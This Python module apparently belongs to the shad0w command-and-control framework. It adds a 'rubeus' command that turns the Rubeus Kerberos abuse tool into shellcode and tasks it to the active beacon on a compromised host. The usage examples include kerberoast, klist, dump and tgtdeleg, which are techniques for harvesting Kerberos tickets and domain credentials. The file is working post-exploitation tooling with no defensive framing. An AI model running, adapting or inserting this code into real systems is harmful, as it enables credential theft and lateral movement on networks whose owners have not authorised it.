#
# Execute rubeus on a session
#

import argparse

from lib import shellcode

__description__ = "A toolset for raw Kerberos interaction and abuses"
__author__ = "@_batsec_, @harmj0y"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of rubeus binary
RUBEUS_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/Rubeus.exe"

# did the command error
ERROR = False
error_list = ""

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None):
    if message != None: print(message)
    return

def rubeus_callback(shad0w, data):
    print(data)

    return ""

def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon", log=True)
        return

    # usage examples
    usage_examples = """
rubeus -x kerberoast
rubeus -x klist
rubeus -x dump
rubeus -x tgtdeleg
rubeus -x help
"""

    # init argparse
    parse = argparse.ArgumentParser(prog='rubeus',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # set the args
    parse.add_argument("-x", "--execute", nargs='+', required=True, help="Rubeus command to execute")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # show the errors to the user
    if not args.execute:
        print(error_list)
        parse.print_help()
        return

    if args.execute:
        params = ' '.join(args.execute)

        # kinda a hack to make sure we intergrate nice with the shellcode generator
        args.param = args.execute
        args.cls = False
        args.method = False
        args.runtime = False
        args.appdomain = False

        b64_comp_data = shellcode.generate(RUBEUS_BIN, args, params)

    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[shad0w.current_beacon]["callback"] = rubeus_callback
